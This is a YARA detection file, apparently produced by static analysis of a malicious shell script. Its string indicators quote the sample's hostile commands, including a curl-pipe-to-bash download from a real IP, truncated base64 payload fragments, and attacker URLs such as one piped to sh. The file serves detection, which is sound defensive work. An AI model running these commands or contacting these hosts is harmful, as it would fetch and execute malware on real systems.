import "hash"

rule Single_Sample_Static_409f260ddaaf0190
{
  meta:
    source = "loop-engineering single-sample static analysis"
    analysis = "static only; sample not executed"
    sha256 = "409f260ddaaf01908f13af576dd0e8e9cfbc7fea549f1f461fea0cb2d5d4b8bc"
    md5 = "88c38702d8d4bbcabc9fb8db7f1aae91"
    sha1 = "e579f6195a8338002f390aa8cd1dc8c4933fdb91"
    file_magic = "script with shebang"
    malwarebazaar_family = "unknown"
  strings:
    $s01 = "curl http://160.119.69.4/x -ks | bash" nocase
    $s02 = "echo -n 'ZWNobyAtbiAnUEQ5d2FIQUtaWEp5YjNKZmNtVndiM0owYVc1bktEQXBPd29rWmowaUwzWmhjaTkzZDNjdmFIUnRiQzloWkcxcGJpOXRiMlIxYkdWekwyWnlaV1Z3WW5oZmFHRXZiR2xqWlc1elpTNXdhSEFpT3dwemVYTjBaVzBvSnlWekp5azdDbk41YzNSbGJTZ2lZWGRySUMxR09" nocase
    $s03 = "echo -n 'ZWNobyAtbiAnUEQ5d2FIQUtaWEp5YjNKZmNtVndiM0owYVc1bktEQXBPd29rWmowaUwzWmhjaTkzZDNjdmFIUnRiQzloWkcxcGJpOXRiMlIxYkdWekwyWnlaV1Z3WW5oZmFHRXZiR2xqWlc1elpTNXdhSEFpT3dwemVYTjBaVzBvSnlWekp5azdDbk41YzNSbGJTZ2lZWGRySUMxR09" nocase
  condition:
    hash.sha256(0, filesize) == "409f260ddaaf01908f13af576dd0e8e9cfbc7fea549f1f461fea0cb2d5d4b8bc" or 2 of ($s*)
}

rule Static_Source_Malware_Indicators
{
  meta:
    source = "loop-engineering static source analysis"
    language_hint = "shell"
    analysis = "static text only; sample not executed"
  strings:
    $url_01 = "http://160.119.69.4/x" nocase
    $ip_02 = "160.119.69.4" nocase
    $domain_03 = "test.sh" nocase
  condition:
    any of them
}


rule Single_Sample_Decoded_Payload_409f260ddaaf0190
{
  meta:
    source = "loop-engineering single-sample analysis (decoded payload layers)"
    analysis = "indicators recovered by statically decoding embedded base64; not executed"
    sha256 = "409f260ddaaf01908f13af576dd0e8e9cfbc7fea549f1f461fea0cb2d5d4b8bc"
  strings:
    $d01 = "85.195.233.39" nocase
    $d02 = "npy.qo" nocase
    $d03 = "http://45.95.147.178/k.php" nocase
    $d04 = "45.95.147.178" nocase
    $d05 = "http://45.95.147.178/z/post/root.php|sh" nocase
    $d06 = "http://45.95.147.178/z/wr.php" nocase
  condition:
    any of them
}
